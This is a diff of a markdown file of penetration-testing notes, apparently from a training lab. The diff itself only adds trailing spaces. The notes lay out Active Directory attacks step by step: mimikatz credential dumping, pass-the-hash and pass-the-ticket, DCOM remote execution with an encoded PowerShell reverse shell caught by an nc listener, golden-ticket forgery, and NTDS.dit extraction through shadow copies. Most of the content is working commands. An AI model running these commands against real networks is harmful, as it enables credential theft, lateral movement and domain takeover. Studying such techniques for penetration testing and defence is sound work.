@@ -1305,13 +1305,13 @@ Login to DC
     mimikatz # privilege::debug
     mimikatz # sekurlsa::logonpasswords
     ```
-  - Create a new logon session with the supplied hash
+  - Create a new logon session with the supplied hash  
     `mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershel`
-  - Map a network share on a remote server
+  - Map a network share on a remote server  
     `PS C:\Windows\system32> net use \\files04`
-  - List kerberos ticket
+  - List kerberos ticket  
     `PS C:\Windows\system32> klist`  #server: krbtgt, cifs
-  - Remote by PsExec
+  - Remote by PsExec  
     `PS C:\tools\SysinternalsSuite> .\PsExec.exe \\files04 cmd`  
 - Pass the Ticket
   - Use dave session (dave has access to WEB04 but jen no) to extract all current TGT/TGS and inject into our session
@@ -1322,17 +1322,17 @@ Login to DC
     mimikatz #sekurlsa::tickets /export
     PS C:\Tools> dir *.kirbi
     ```
-  - Pick any TGS ticket in dave@cifs-web04.kirbi and inject it to our session
+  - Pick any TGS ticket in dave@cifs-web04.kirbi and inject it to our session  
     `mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`  
-  - Inspecting the injected ticket in memory
+  - Inspecting the injected ticket in memory  
     `klist` #server: cifs/web04
 - DCOM
   - CLIENT74 (Jen) to FILES04
   - From an elevated PowerShell, instantiate a remote MMC 2.0 application by specifying the target IP of FILES04  
     `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))`  
-  - Execute a command on the remote DCOM object
+  - Execute a command on the remote DCOM object  
     `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")`
-  - Adding a reverse-shell as a DCOM payload on CLIENT74
+  - Adding a reverse-shell as a DCOM payload on CLIENT74  
     ```
     #Executing the WMI PowerShell payload
     import sys
@@ -1349,15 +1349,15 @@ Login to DC
     ```
     `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
 AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
-  - Switch back to kali
-    `kali@kali:~$ nc -lnvp 443`
+  - Switch back to kali  
+    `kali@kali:~$ nc -lnvp 443`  
     `PS C:\Windows\system32> hostname` #FILE04
 
 **Out of scope**
 - 👥 Golden ticket
   Pre-requisites: DC privileges, NTLM hash of krbtgt, Domain SID  
   Note: PsExec connects via hostname  
-  1. From compromised CLIENT74 workstation (jen） attempt lateral movement
+  1. From compromised CLIENT74 workstation (jen） attempt lateral movement  
      `psexec.exe \\DC1 cmd`
   3. On DC1 (jeffadmin) extract krbtgt hash, domain SID  
      ```
@@ -1367,23 +1367,23 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
      ```
   5. Return to low-Privileged Workstation CLIENT74 (jen), open Mimikatz and purge existing kerberos ticket  
      `kerberos::purge`
-  7. Forget golden ticket
+  7. Forget golden ticket  
      `kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:NTLMHASH /id:500 /ptt`  
-  9. Spawn a New Elevated Shell in mimikatz
+  9. Spawn a New Elevated Shell in mimikatz  
       `misc::cmd`
-  11. Validate Access with Lateral Movemen
+  11. Validate Access with Lateral Movemen  
       `psexec.exe \\DC1 cmd`  #jen has domain admin group memberships now  
 - Shadow Copies 
   1. obtain domain admin (jeffadmin)
-  2. create shadow copy by note down the generated shadow copy device name
+  2. create shadow copy by note down the generated shadow copy device name  
      `vshadow.exe -nw -p C:`  
      `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1`  
   4. Copy the NTDS Database from the Shadow Copy
      `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit.bak`  
-  6. Dump the SYSTEM Hive from the Registry
+  6. Dump the SYSTEM Hive from the Registry  
      `reg save HKLM\SYSTEM C:\system.bak`  
   8. Move the ntds.dit.bak, system.bak to kali
-  9. Use Impacket’s secretsdump.py to parse the NTDS Database Offline
+  9. Use Impacket’s secretsdump.py to parse the NTDS Database Offline  
      `secretsdump.py -ntds ntds.dit.bak -system system.bak LOCAL`
   11. cracked offline by using hashcat or john
 
